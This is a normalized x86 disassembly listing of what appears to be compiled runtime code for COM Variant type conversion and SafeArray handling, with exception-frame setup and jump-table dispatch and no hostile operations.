lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408344
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_40405c
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_408344
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_40405c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409788
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_40405c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_409788
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_40405c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_412594
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404290
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_4125cc
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404290
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404230
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_412604
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404290
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408344
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_40405c
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408344
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_40405c
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408344
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_40405c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_408430
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_40405c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_408430
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_40405c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_41287c
jmp r-xdata
sub_412dc0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412e6a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412e4d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40ef48
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_404824
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404910
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412e54
lea eax [ ebp - 0x10 ]
call sub_40f2ec
retn
sub_412e78
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412ece
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f614
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412fa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412ed5
lea eax [ ebp - 0x10 ]
call sub_40f2ec
retn
sub_412edc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_412f94
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_415978
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412f9b
lea eax [ ebp - 0x20 ]
call sub_404714
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412f77
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_404824
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404910
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f2ec
retn
sub_412fa4
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4134f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_412fde ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404860
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404714
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_408344
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404860
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408344
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404860
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409788
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404860
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409788
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404860
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_412594
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404750
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_4125cc
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404750
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_404824
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404910
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_412604
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_404750
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_408344
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404860
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_408344
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_404860
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_408344
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_404860
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_408430
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_404860
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_408430
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_404860
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412fa4
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_412dc0
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_404750
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4134fd
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_40472c
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_40402c
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_40472c
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_40402c
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_40472c
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_40402c
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_40472c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40402c
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_412e78
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_404750
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404860
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40eb08
test ah 0x40
je r-xdata
mov eax esi
call sub_404714
mov edx eax
mov eax ebx
call sub_412edc
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_412dc0
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_404750
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_412dc0
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_404750
jmp r-xdata
jmp [ eax * 4 + jump_table_413265 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408344
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_404860
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_408344
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_404860
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_409788
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_404860
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409788
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_404860
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_412594
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_404750
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_4125cc
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404750
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404824
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_412604
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404750
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408344
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404860
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408344
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_404860
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408344
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_404860
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_408430
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_404860
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_408430
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_404860
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412fa4
jmp r-xdata
sub_413504
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41356e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f614
lea eax [ ebp - 0x10 ]
call [ rw-data ]
cmp [ ebp - 0x10 ] 0xd
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_405a50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413575
lea eax [ ebp - 0x10 ]
call sub_40f2ec
retn
mov dx 0xd
mov ax 0x101
call sub_40eb08
sub_41357c
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
cmp eax 0xd
jg r-xdata
sub eax 0x101
je r-xdata
je r-xdata
mov edx ebx
mov eax esi
call sub_413504
jmp r-xdata
sub eax 0x3f08
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_405a50
jmp r-xdata
sub eax 0x1
jb r-xdata
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_405a50
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax esi
call sub_405a38
jmp r-xdata
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x8
je r-xdata
mov edx esp
mov ax [ ebx ]
call sub_415978
test al al
je r-xdata
mov eax esi
call sub_405a38
jmp r-xdata
mov dx 0xd
mov ax 0x1
call sub_40eb08
jmp r-xdata
mov ax [ ebx ]
mov dx 0xd
call sub_40eb08
mov eax esi
call sub_405a38
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_4032e8
test al al
jne r-xdata
sub_413648
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov ax [ ebx ]
sub ax 0x1
jb r-xdata
mov eax esi
call sub_405a38
jmp r-xdata
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0x8
je r-xdata
mov eax esi
call sub_405a38
jmp r-xdata
mov dx 0x9
mov ax 0x1
call sub_40eb08
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_405a50
jmp r-xdata
sub ax 0x4000
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_405a50
jmp r-xdata
jmp r-xdata
mov edx esp
mov ax [ ebx ]
call sub_415978
test al al
je r-xdata
mov ax [ ebx ]
mov dx 0x9
call sub_40eb08
mov eax esi
call sub_405a38
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_4032e8
test al al
jne r-xdata
sub_4136f4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40f270
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_413730
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40f270
sub_413750
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x11
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40f270
sub_413770
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x12
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40f270
sub_413790
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x13
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40f270
sub_4137b0
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x10
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40f270
sub_4137d0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x2
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40f270
sub_4137f0
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f270
sub_41381c
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x4
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_40f270
sub_413840
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x5
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f270
sub_41386c
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x6
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f270
sub_413898
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x7
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f270
sub_4138c4
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40f270
sub_413928
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_40405c
pop esi
pop ebx
retn
mov eax ebx
call sub_40f270
sub_413954
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_413997
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_40426c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_413928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41399e
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_4139a4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_404910
pop esi
pop ebx
retn
mov eax ebx
call sub_40f270
sub_4139dc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0xd
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_405a50
pop esi
pop ebx
retn
mov eax ebx
call sub_40f270
sub_413a08
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x9
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_405a50
pop esi
pop ebx
retn
mov eax ebx
call sub_40f270
sub_413a34
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_413a77
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404860
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4139a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413a7e
lea eax [ ebp - 0x4 ]
call sub_404714
retn
sub_413a84
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413ada
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f614
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f614
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413ae1
lea eax [ ebp - 0x10 ]
call sub_40f2ec
retn
sub_413af0
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ ebx ] 0x400c
jne r-xdata
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_413af0
jmp r-xdata
mov di [ ebx ]
movzx eax di
cmp eax 0x14
jg r-xdata
mov eax esi
call sub_40f270
pop edx
pop edi
pop esi
pop ebx
retn
sub eax 0x100
je r-xdata
je r-xdata
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_413a34
jmp r-xdata
dec eax
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add eax 0xfffffff0
sub eax 0x3
jb r-xdata
mov edx ebx
mov eax esi
call sub_413a84
jmp r-xdata
jmp r-xdata
jg r-xdata
cmp [ ebx + 0x8 ] 0x7fffffff
ja r-xdata
mov edx ebx
mov eax esi
mov ecx 0x3
call sub_40fb58
jmp r-xdata
je r-xdata
test di 0x2000
je r-xdata
mov edx ebx
mov eax esi
mov ecx 0x5
call sub_40fb58
jmp r-xdata
cmp [ ebx + 0xc ] 0xffffffff
jne r-xdata
jmp r-xdata
test [ ebx + 0xb ] 0x80
je r-xdata
jmp r-xdata
mov eax edi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov ecx sub_413ae8
mov edx ebx
mov eax esi
call sub_40f394
jmp r-xdata
jl r-xdata
cmp [ ebx + 0x8 ] 0x80000000
jb r-xdata
mov edx ebx
mov eax esi
mov ecx 0x3
call sub_40fb58
jmp r-xdata
mov edx ebx
mov eax esi
mov ecx 0x5
call sub_40fb58
jmp r-xdata
mov edx esp
mov eax edi
call sub_415978
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_40f614
jmp r-xdata
mov edx ebx
mov eax esi
mov ecx 0x3
call sub_40fb58
jmp r-xdata
jmp r-xdata
call sub_40eab4
mov ecx ebx
mov edx esi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
sub_413dc4
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_413eea
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_40405c
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_40405c
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_415978
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_40405c
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404314
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_408458
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_404314
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403184
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402934
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_40426c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413ef1
lea eax [ ebp - 0x208 ]
call sub_404008
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404314
sub_413f94
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_413f68
test al al
jne r-xdata
mov eax esi
mov edx edi
call sub_40405c
mov eax esi
mov edx ebx
call sub_41287c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_413fc0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414009
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_404860
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax ebx
call sub_414018
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414010
lea eax [ ebp - 0x4 ]
call sub_404714
retn
sub_414018
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_413f68
test al al
jne r-xdata
mov eax esi
mov edx edi
call sub_404750
mov eax esi
mov edx ebx
call sub_412fa4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_414068
push ebx
mov bx [ eax ]
cmp bx 0x400c
jne r-xdata
mov [ edx ] bx
test [ edx + 0x1 ] 0x20
setne bl
test bl bl
je r-xdata
mov eax [ eax + 0x8 ]
call sub_414068
mov ebx eax
jmp r-xdata
xor eax eax
mov [ ecx ] eax
test [ edx + 0x1 ] 0x40
je r-xdata
mov eax ebx
pop ebx
retn
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
sub_4140ac
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
mov [ ebp - 0x2 ] cx
mov ebx edx
mov esi eax
test bl 0x1
je r-xdata
call sub_40ec94
cmp ebx 0x7f
jg r-xdata
mov [ ebp - 0x8 ] ebx
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
adc ebx 0x0
mov ax [ ebp - 0x2 ]
call sub_414224
test al al
jne r-xdata
lea eax [ ebp - 0x208 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0x2 ]
push eax
call SafeArrayCreate
mov ebx eax
test ebx ebx
jne r-xdata
inc ebx
lea edx [ ebp - 0x208 ]
mov eax esi
inc ebx
sar ebx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
call sub_40f2ec
mov ax [ ebp - 0x2 ]
or ax 0x2000
mov edx [ ebp + 0x8 ]
mov [ edx ] ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_40ec94
mov ecx edx
mov esi [ eax ]
mov [ ecx + 0x4 ] esi
mov esi [ eax + 0x4 ]
sub esi [ ecx + 0x4 ]
inc esi
mov [ ecx ] esi
add eax 0x8
add edx 0x8
dec ebx
jne r-xdata
sub_414154
push ebx
add esp 0xfffffff8
mov ebx eax
mov ecx esp
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_414068
test al al
jne r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax 0x80070057
call sub_40ef3c
sub_41417c
push ebx
add esp 0xfffffff8
mov ebx eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_414068
test al al
je r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
movzx eax [ eax ]
jmp r-xdata
pop ecx
pop edx
pop ebx
retn
sub_4141a4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push esi
mov eax ebx
call sub_414154
push eax
call SafeArrayGetLBound
call sub_40ef3c
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_4141c8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push esi
mov eax ebx
call sub_414154
push eax
call SafeArrayGetUBound
call sub_40ef3c
mov eax [ esp ]
